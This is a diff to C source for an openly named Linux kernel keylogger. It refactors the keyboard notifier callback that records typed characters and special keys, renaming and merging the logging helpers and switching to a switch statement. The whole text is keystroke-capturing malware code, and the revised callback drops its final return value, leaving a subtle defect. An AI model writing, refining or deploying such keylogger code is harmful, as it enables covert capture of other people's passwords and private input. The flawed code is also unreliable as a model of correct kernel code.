@@ -70,12 +70,12 @@ static void append_token(const char *token)
     }
 }
 
-static void log_unicode_char(unsigned int ch)
+static void log_printable(unsigned int v)
 {
-    char c = (char)ch;
+    char c = (char)v;
 
     // ASCII space to ~
-    if ((c >= 0x20 && c <= 0x7E))
+    if (c >= 0x20 && c <= 0x7E)
     {
         append_char(c);
     }
@@ -120,16 +120,6 @@ static void log_special_key(unsigned int keycode)
     }
 }
 
-static void log_keysym(unsigned int sym)
-{
-    char c = (char)sym;
-
-    if (c >= 0x20 && c <= 0x7E) 
-    {
-        append_char(c);
-    }
-}
-
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct
@@ -139,21 +129,17 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
         return NOTIFY_OK;
     }
 
-    // KBD_UNICODE for text, KBD_KEYCODE for special keys
-    if (code == KBD_UNICODE) 
+    switch (code)
     {
-        log_unicode_char(param->value); // text
-    } 
-    else if (code == KBD_KEYCODE)
-    {
-        log_special_key(param->value); // actions
-    }
-    else if (code == KBD_KEYSYM)
-    {
-        log_keysym(param->value); // actions with keysyms
-    }
+        case KBD_KEYCODE:
+            log_special_key(param->value); // actions
+            break;
 
-    return NOTIFY_OK; 
+        case KBD_UNICODE:
+        case KBD_KEYSYM:
+            log_printable(param->value); // text: uses same logic for both
+            break;
+    }
 }
 
 static struct notifier_block keylogger_nb =
